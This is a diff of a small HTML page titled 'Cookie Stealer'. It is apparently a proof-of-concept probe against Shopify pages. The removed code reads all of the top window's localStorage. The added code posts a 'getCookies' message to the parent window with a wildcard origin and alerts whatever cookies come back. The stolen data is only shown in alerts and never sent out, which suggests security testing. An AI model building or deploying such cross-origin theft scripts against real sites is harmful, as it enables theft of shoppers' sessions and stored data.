@@ -3,33 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Stealer00</title>
+    <title>Cookie Steale8989r</title>
 </head>
 <body>
     <script>
-        // Function to retrieve and display localStorage from cdn.shopify.com
-        function displayShopifyLocalStorage() {
-            try {
-                const topWindow = window.top;
-                const shopifyLocalStorage = topWindow.localStorage;
-
-                // Retrieve all items from localStorage
-                const shopifyLocalStorageItems = {};
-                for (let i = 0; i < shopifyLocalStorage.length; i++) {
-                    const key = shopifyLocalStorage.key(i);
-                    const value = shopifyLocalStorage.getItem(key);
-                    shopifyLocalStorageItems[key] = value;
-                }
-
-                alert('Shopify localStorage: ' + JSON.stringify(shopifyLocalStorageItems));
-            } catch (e) {
-                console.error('Error accessing localStorage:', e);
-                alert('Error accessing localStorage: ' + e.message);
-            }
+        // Function to send a message to the parent window
+        function sendMessageToParent() {
+            const message = { type: 'getCookies' };
+            window.top.postMessage(message, '*');
         }
 
-        // Call the function to display Shopify localStorage
-        displayShopifyLocalStorage();
+        // Listen for messages from the parent window
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'cookies') {
+                alert('Shopify Cookies: ' + event.data.cookies);
+            }
+        });
+
+        // Send the initial message to the parent window
+        sendMessageToParent();
     </script>
 </body>
 </html>
